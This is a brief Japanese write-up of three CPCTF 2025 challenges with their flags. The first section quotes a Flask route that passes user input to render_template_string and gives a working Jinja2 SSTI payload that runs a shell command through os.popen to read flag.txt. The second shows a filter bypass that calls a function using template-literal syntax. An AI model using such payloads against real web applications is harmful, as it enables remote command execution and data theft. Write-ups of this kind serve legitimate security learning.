# CPCTF 2025 writeup

## Name Omikuji(web)

render_template_stringがありました。SSTIです。

```python
 fortune = get_fortune(name)

    result = f"""
    {css}
    <h1>🔮 名前占い 🔮</h1>
    <div class="result">
        <p>こんにちは、{name}さん。</p>
        <p>あなたの運勢は…… <span class="fortune">{fortune}</span> です！</p>
    """

    if fortune == "大吉":
        with open("flag.txt", "r") as f:
            content = f.read()
            result += f'<div class="flag">フラグは{content}です。</div>'

    result += "</div>"
    return render_template_string(result)
```
`render_template_string`というのがimportされていた。
SSTIが使えそう
```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
```

```
CPCTF{sst1_is_d3ngerou2}
```


## String Calculator(web)
```javascript
const getFlag = () => process.env.FLAG ?? "";

...省略...

app.get("/api/flag", require("hono/bearer-auth").bearerAuth({ token: btoa(getFlag()) }), (c) => {
  return c.text(getFlag());
});

```
`server.js`の`getFlag`を実行できればFLAGが出そう。
`getFlag()`と実行したいが、`()`がブロックされてるらしい。

`getFlag`` `で実行できるらしい。

```
CPCTF{JavaScr!pt_!s_4n_4wes0me_1anguage}
```

## XFD(shell)
A~XFDを出力してSHA-256する。

```shell
echo {A..Z} {A..Z}{A..Z} {A..W}{A..Z}{A..Z} X{A..E}{A..Z} XF{A..D} | tr ' ' '\n' | shasum -a 256
```
`tr ' ' '\n'` は` `を`\n`に置き換える

```
CPCTF{6526814a735caafefa75d482c954e11d49c110f5dc73dce2f951d6b11339c05b} 
```
